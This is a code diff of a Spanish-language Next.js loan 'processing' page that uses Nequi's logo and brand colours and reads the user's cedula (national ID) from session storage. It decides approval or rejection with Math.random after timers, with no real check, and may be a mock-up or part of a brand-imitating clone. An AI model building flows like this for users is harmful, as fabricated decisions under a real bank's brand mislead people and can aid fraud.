@@ -2,32 +2,38 @@
 
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import Image from "next/image"
-import LoadingSpinner from "../components/loading-spinner"
+import LoadingSpinner from "@/app/components/loading-spinner"
 import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { useRouter } from "next/navigation"
+import TransitionLoader from "../components/transition-loader"
 
 export default function ProcesandoPage() {
   const [status, setStatus] = useState<'processing' | 'approved' | 'rejected'>('processing')
+  const [showTransition, setShowTransition] = useState(false)
   const router = useRouter()
 
-  useEffect(() => {
-    const checkStatus = async () => {
-      const cedula = sessionStorage.getItem('cedula')
-      // Aquí deberías implementar una función para verificar el estado del préstamo
-      // Por ahora, simularemos una respuesta después de 5 segundos
-      await new Promise(resolve => setTimeout(resolve, 5000))
-      setStatus(Math.random() > 0.5 ? 'approved' : 'rejected')
-    }
-
-    checkStatus()
-  }, [])
+ useEffect(() => {
+   const checkStatus = async () => {
+     const cedula = sessionStorage.getItem('cedula')
+     // Simular el proceso de verificación
+     setTimeout(() => {
+       setShowTransition(true)
+       setTimeout(() => {
+         setStatus(Math.random() > 0.5 ? 'approved' : 'rejected')
+         setShowTransition(false)
+       }, 2000)
+     }, 5000)
+   }
+ 
+   checkStatus()
+ }, [])
 
   return (
-    <main className="min-h-screen bg-white">
+    <main className="min-h-screen bg-pink-50 relative">
 
-       {/* Navbar */}
-       <nav className="relative z-10 bg-white shadow-sm px-4 py-2">
+      {/* Navbar */}
+      <nav className="relative z-10 bg-white shadow-sm px-4 py-2">
         <div className="max-w-7xl mx-auto flex justify-between items-center">
           <Image
             src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
@@ -36,8 +42,8 @@ export default function ProcesandoPage() {
             height={40}
             priority
           />
-          <Button 
-            variant="ghost" 
+          <Button
+            variant="ghost"
             onClick={() => window.location.reload()}
             className="bg-[#E6007E] hover:bg-[#C4006B] text-white rounded-md px-4 py-2"
           >
@@ -45,6 +51,16 @@ export default function ProcesandoPage() {
           </Button>
         </div>
       </nav>
+
+      {showTransition && <TransitionLoader />}
+      {/* Background Image */}
+      <div 
+        className="absolute inset-0 bg-cover bg-center z-0"
+        style={{ 
+          backgroundImage: 'url("img/background.png")',
+          opacity: 0.1 
+        }}
+      />
 
       <div className="container mx-auto px-4 py-8 max-w-3xl">
         <div className="flex justify-center mb-8">
@@ -60,16 +76,16 @@ export default function ProcesandoPage() {
         <Card className="shadow-lg border-2">
           <CardHeader className="text-center pb-2">
             <CardTitle className="text-2xl font-manrope">
-              {status === 'processing' ? 'Procesando tu solicitud' : 
-               status === 'approved' ? '¡Felicitaciones! Tu solicitud fue aprobada' : 
-               'Lo sentimos, tu solicitud no fue aprobada'}
+              {status === 'processing' ? 'Procesando tu solicitud' :
+                status === 'approved' ? '¡Felicitaciones! Tu solicitud fue aprobada' :
+                  'Lo sentimos, tu solicitud no fue aprobada'}
             </CardTitle>
           </CardHeader>
           <CardContent className="text-center space-y-6 pt-4">
             {status === 'processing' ? (
               <>
                 <div className="flex flex-col items-center gap-4">
-                  <LoadingSpinner size="lg" />
+                  <LoadingSpinner />
                   <div className="space-y-2">
                     <p className="text-lg font-medium text-[#200020]">
                       Estamos validando tu información
@@ -122,7 +138,7 @@ export default function ProcesandoPage() {
                   <p className="text-lg text-gray-700">
                     En este momento no podemos aprobar tu solicitud. Te invitamos a intentarlo nuevamente en unos dias.
                   </p>
-                  <Button 
+                  <Button
                     onClick={() => router.push('/')}
                     className="bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl"
                   >
